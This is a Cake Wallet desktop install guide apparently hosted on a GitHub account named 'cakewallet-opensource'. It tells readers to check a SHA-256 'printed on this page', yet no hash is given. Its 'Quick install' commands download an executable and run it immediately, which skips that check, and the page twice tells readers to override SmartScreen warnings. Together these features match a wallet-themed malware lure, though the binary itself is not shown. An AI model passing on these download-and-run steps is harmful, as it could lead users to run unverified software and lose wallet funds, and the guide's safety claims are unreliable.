![Cake Wallet windows install guide](assets/cake-wallet-windows-install-article-banner.png)

# Install Cake Wallet on Windows Desktop

Download the desktop build, check it is genuine, then open or restore your wallet.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Download cake-wallet-desktop-v6.4.5-windows.exe from the Cake Wallet desktop release, run it, and create or restore a wallet. The Windows build is the same non-custodial wallet as the mobile app, so one recovery phrase works on both. Check the SHA-256 before you run anything.

<!-- ARTICLE-BODY-BEGIN -->

## Before you install
Have your recovery phrase somewhere offline before you touch the installer. If this is a new wallet you do not need one yet; if you are moving an existing wallet, write the phrase down and <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md">back up your Cake Wallet wallet</a> from the old device first. Installing on a second machine never replaces the wallet on the first one, and both copies stay valid.
A Windows PC needs a 64-bit build of Windows 10 (1909) or later. The installer is a single .exe file: there is no separate runtime, no account and no sign-in step. If you are unsure whether a desktop wallet is worth having at all, the answer is the same as on mobile: the keys live on your machine, and nobody else can move the funds.

## Install the Windows build
Run the downloaded file and follow the setup steps. Windows may show a SmartScreen warning for a file it has not seen before; choose More info, then Run anyway, and only after you have compared the hash described below. When the app opens it asks for a PIN and then offers to create or restore a wallet.

Choose Restore Wallet if you already hold funds, and follow the path that matches what you saved: phrase or keys, QR code, backup file or a hardware device. The step-by-step choices are the same as on any other platform, and <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md">restore an existing Cake Wallet wallet</a> walks through each one. A fresh install with no backup starts a new wallet instead.

## Verify what you downloaded
Every release asset has a published SHA-256. On Windows, open PowerShell in the download folder and run `Get-FileHash .\cake-wallet-desktop-v6.4.5-windows.exe -Algorithm SHA256`, then compare the 64 characters with the value printed on this page. If a single character differs, delete the file and download it again from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a>; do not run it to see what happens.
The version numbers matter more than they look. This page and the hash above describe the build labelled v6.4.5. Newer features described elsewhere in these guides belong to newer builds, so check the release page before you expect one of them on this download. Hash comparison is the one check that does not depend on trusting a website or a search result.

## If the app will not start
A desktop build that closes immediately, hangs on a splash screen or never finishes connecting usually needs the same first step as any other fault: install the current build over the old one, keeping your wallet. Do not uninstall first, and do not delete the app data folder while you still have funds on the device.

If it still fails, work through the startup checks in order rather than reinstalling repeatedly. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-app-not-opening.md">Cake Wallet app not opening</a> separates a permissions problem from a corrupted install and from a wallet that is merely still syncing, which matters because reinstalling is the step that can cost you a wallet if the phrase is not written down.

## If the app opens but shows no balance
An empty balance on a restored wallet is normal for the first minutes and sometimes for much longer with Monero, because the wallet has to read the chain before it can show what you hold. Look at the sync indicator before you conclude anything is missing.

A balance that stays at zero after a completed sync is a different problem, and the order of checks matters: sync, confirmations, the right wallet and account, then a rescan. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md">Cake Wallet funds not appearing</a> lays those out with the on-screen signals to look for, so you can stop at the step that matches what you see.

## FAQ
### What are Cake Wallet's system requirements?
A 64-bit Windows 10 (1909) or later installation. The wallet is a native desktop app, so there is no browser extension and no web login.
### Is Cake Wallet on desktop?
Yes. The same account publishes Windows, macOS and Linux builds of the desktop app alongside the mobile apps on Google Play and the App Store.
### How do I update Cake Wallet?
Install the newer build over the current one and keep your wallet. The app data stays in place, and your recovery phrase still restores everything if an update goes wrong.
### Does Cake Wallet still have a Windows app?
Yes, and the current release page lists the Windows installer by name. Download it from that page rather than a mirror or a search advert.
### What is the best crypto wallet for PC?
The one where you hold the keys and can restore without the vendor. Cake Wallet is non-custodial and open source, and its Windows build restores from the same phrase as the mobile app.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[restore a wallet in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) · [Cake Wallet backup and recovery phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) · [Cake Wallet app not opening](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-app-not-opening.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
